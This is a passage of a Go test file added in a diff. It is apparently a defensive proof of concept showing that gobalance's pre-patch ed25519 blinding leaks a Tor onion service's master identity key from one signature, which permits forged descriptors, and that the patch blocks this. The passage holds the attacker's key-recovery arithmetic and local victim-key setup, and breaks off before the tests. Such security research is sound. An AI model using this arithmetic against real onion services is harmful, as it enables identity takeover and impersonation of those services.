+// Package poc — SECURITY PROOF OF CONCEPT (defensive research, local keys only)
+//
+// Test01 runs the full onion-identity takeover attack against the PRE-PATCH
+// snapshot (poc/vulnerable — byte-for-byte the original ed25519.go from git
+// history): ONE public blinded signature is enough to recover the master
+// identity scalar (mod L) and forge descriptor signatures for ANY future
+// time period, byte-identical to the victim's own.
+//
+// Test02–Test04 then show the PATCHED code closing each step:
+//   - truncated tor keys (the vulnerable configuration) are rejected;
+//   - patched signatures remain protocol-correct (standard ed25519);
+//   - running the identical attack math against a patched signature yields
+//     garbage that does not match the real master scalar.
+package poc
+
+import (
+	"bytes"
+	"crypto/ed25519"
+	"crypto/sha512"
+	"math/big"
+	"testing"
+
+	"gobalance/pkg/stem/util"
+	vulnerable "gobalance/poc/vulnerable"
+)
+
+// attackerMath reimplements the attack arithmetic black-box style (only
+// public constants + SHA-512 + big.Int — no gobalance internals needed).
+func attackerHint(m []byte) *big.Int {
+	d := sha512.Sum512(m)
+	sum := new(big.Int)
+	for i := 0; i < 512; i++ {
+		bit := (d[i/8] >> (i % 8)) & 1
+		sum.Add(sum, new(big.Int).Lsh(big.NewInt(int64(bit)), uint(i)))
+	}
+	return sum
+}
+
+func attackerKPrime() []byte {
+	d := sha512.Sum512([]byte("Derive temporary signing key hash input"))
+	return d[:32]
+}
+
+func attackerBlindingMult(nonce []byte) *big.Int {
+	sum := new(big.Int)
+	for i := 3; i < 254; i++ {
+		bit := (nonce[i/8] >> (i % 8)) & 1
+		sum.Add(sum, new(big.Int).Lsh(big.NewInt(int64(bit)), uint(i)))
+	}
+	return sum.Add(sum, new(big.Int).Lsh(big.NewInt(1), 254))
+}
+
+func attackerDecodeInt(s []byte) *big.Int {
+	sum := new(big.Int)
+	for i := 0; i < 256; i++ {
+		bit := (s[i/8] >> (i % 8)) & 1
+		sum.Add(sum, new(big.Int).Lsh(big.NewInt(int64(bit)), uint(i)))
+	}
+	return sum
+}
+
+var attackerL = new(big.Int).Add(new(big.Int).Lsh(big.NewInt(1), 252),
+	bigFromDecimal("27742317777372353535851937790883648493"))
+
+func bigFromDecimal(s string) *big.Int {
+	v := new(big.Int)
+	v.SetString(s, 10)
+	return v
+}
+
+// makeVictimTorKey generates a fresh tor-format extended key (a||h) plus the
+// public identity key embedded in the onion address.
+func makeVictimTorKey() (esk []byte, identityPub []byte) {
+	_, seed, _ := ed25519.GenerateKey(nil)
+	d := sha512.Sum512(seed)
+	a := append([]byte{}, d[:32]...)
+	a[0] &= 248
+	a[31] &= 63
+	a[31] |= 64
+	esk = append(append([]byte{}, a...), d[32:]...)
+	identityPub = attackerPubFromScalar(attackerDecodeInt(a))
+	return
+}
